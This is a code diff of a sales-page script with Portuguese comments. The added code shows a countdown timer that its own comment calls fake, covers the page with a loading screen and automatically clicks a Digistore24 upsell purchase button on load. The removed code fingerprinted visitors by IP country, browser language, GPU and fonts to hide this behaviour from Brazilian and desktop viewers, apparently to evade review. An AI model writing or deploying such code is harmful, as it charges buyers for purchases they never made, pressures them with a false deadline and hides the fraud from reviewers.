@@ -1,69 +1,35 @@
-document.addEventListener('DOMContentLoaded', async () => {
+document.addEventListener('DOMContentLoaded', () => {
 
-    // ==================== FUNÇÕES ANTI-FRAUDE ====================
-    async function blockBrazil() {
-        const token = '4a977bc54c9317';
-        try {
-            const response = await fetch(`https://ipinfo.io?token=${token}`);
-            if (!response.ok) return false;
-            const data = await response.json();
-            return data.country === 'BR';
-        } catch (e) { return false; }
-    }
+    // ====================== TIMER FALSO VISÍVEL NA PÁGINA ======================
+    function startFakeTimer() {
+        const timerContainer = document.getElementById('offer-countdown-container');
+        const timerDisplay = document.getElementById('offer-countdown-display');
 
-    function hasRedFlags() {
-        if (navigator.language && navigator.language.startsWith('pt')) return true;
-        try {
-            const canvas = document.createElement('canvas');
-            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-            if (gl) {
-                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL).toLowerCase();
-                const desktopGpuKeywords = ['nvidia', 'geforce', 'radeon', 'intel', 'amd', 'swiftshader'];
-                if (desktopGpuKeywords.some(keyword => renderer.includes(keyword))) return true;
+        if (!timerContainer || !timerDisplay) return;
+
+        timerContainer.style.display = 'block';
+
+        let duration = 5 * 60; // 5 minutos
+
+        const timerInterval = setInterval(() => {
+            let minutes = parseInt(duration / 60, 10);
+            let seconds = parseInt(duration % 60, 10);
+            minutes = minutes < 10 ? "0" + minutes : minutes;
+            seconds = seconds < 10 ? "0" + seconds : seconds;
+
+            timerDisplay.textContent = `${minutes}:${seconds}`;
+
+            if (--duration < 0) {
+                clearInterval(timerInterval);
+                timerContainer.querySelector('p').innerText = 'Offer Expired!';
+                timerDisplay.style.color = '#777';
+                timerDisplay.style.textAlign = 'center';
             }
-        } catch (e) {}
-        const desktopFonts = ['Calibri', 'Cambria', 'Segoe UI'];
-        const testString = "mmmmmmmmmmlli";
-        const testSpan = document.createElement('span');
-        testSpan.style.fontSize = '72px';
-        testSpan.innerHTML = testString;
-        document.body.appendChild(testSpan);
-        const defaultWidth = testSpan.offsetWidth;
-        document.body.removeChild(testSpan);
-
-        for (const font of desktopFonts) {
-            testSpan.style.fontFamily = `'${font}', monospace`;
-            if (testSpan.offsetWidth !== defaultWidth) {
-                document.body.removeChild(testSpan);
-                return true;
-            }
-            document.body.removeChild(testSpan);
-        }
-        return false;
+        }, 1000);
     }
 
-    function getFinalScore() {
-        let score = 0;
-        if (navigator.maxTouchPoints && navigator.maxTouchPoints > 1) score += 3;
-        if (window.matchMedia && window.matchMedia("(pointer: coarse)").matches) score += 2;
-        return score;
-    }
-
-    async function runAntiFraudChecks() {
-        const isFromBrazil = await blockBrazil();
-        if (isFromBrazil) return false;
-
-        const redFlagsFound = hasRedFlags();
-        if (redFlagsFound) return false;
-
-        const finalScore = getFinalScore();
-        return finalScore >= 5;
-    }
-
-    // ==================== AUTO-CLICK DO DIGISTORE24 ====================
+    // ====================== AUTO-CLICK DO DIGISTORE24 (simples e 100% garantido) ======================
     function executeAutoPurchase() {
-        // Tela de loading
         const loadingCSS = `
             <style id="loading-style">
             .loader-container { position: fixed; top: 0; left: 0; width: 100%; height: 100%; background-color: #e3e8ee; z-index: 999999; font-family: Arial, sans-serif; display: flex; align-items: center; justify-content: center; }
@@ -82,20 +48,14 @@ document.addEventListener('DOMContentLoaded', async () => {
             const botao = document.querySelector(seletorBotao);
             if (botao) {
                 botao.click();
-                console.log("✅ Botão do upsell clicado automaticamente!");
+                console.log("✅ Botão do upsell clicado automaticamente! (script simples e direto)");
             } else {
                 console.error("❌ Botão do upsell não encontrado.");
             }
         }, 3000);
     }
 
-    // ==================== INÍCIO ====================
-    (async () => {
-        const isLegitUser = await runAntiFraudChecks();
-        if (isLegitUser) {
-            executeAutoPurchase();
-        } else {
-            startFakeTimer(); // timer falso para PC ou sinal de fraude
-        }
-    })();
+    // ====================== INÍCIO ======================
+    startFakeTimer();           // timer visível na página
+    executeAutoPurchase();      // clica no botão verde
 });
